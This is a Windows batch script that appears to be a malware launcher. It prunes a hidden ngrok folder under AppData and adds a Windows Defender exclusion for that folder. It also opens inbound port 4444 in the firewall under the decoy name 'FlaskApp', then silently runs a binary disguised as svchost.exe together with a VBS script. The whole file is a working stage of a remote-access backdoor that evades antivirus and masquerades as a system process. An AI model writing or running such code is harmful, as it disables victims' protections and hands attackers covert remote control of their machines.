@echo off
for /f "tokens=*" %%a in ('echo %USERNAME%') do set USERNAME=%%a
set "NGROK_PATH=C:\Users\%USERNAME%\AppData\Local\ngrok"

for %%F in ("%NGROK_PATH%\*") do (
    if /I not "%%~nxF"=="svchost.exe" if /I not "%%~nxF"=="hst.vbs" if /I not "%%~nxF"=="ss.cmd" if /I not "%%~nxF"=="ngrok.exe" if /I not "%%~nxF"=="ngrok.yml" (
        del /f /q "%%F" >nul 2>&1
    )
)

powershell -Command "$ngrokPath = '%NGROK_PATH%'; Add-MpPreference -ExclusionPath $ngrokPath" >nul 2>&1
powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -EdgeTraversalPolicy Allow" >nul 2>&1

powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%NGROK_PATH%\svchost.exe' -WindowStyle Hidden"
start "" "%NGROK_PATH%\hst.vbs"
exit
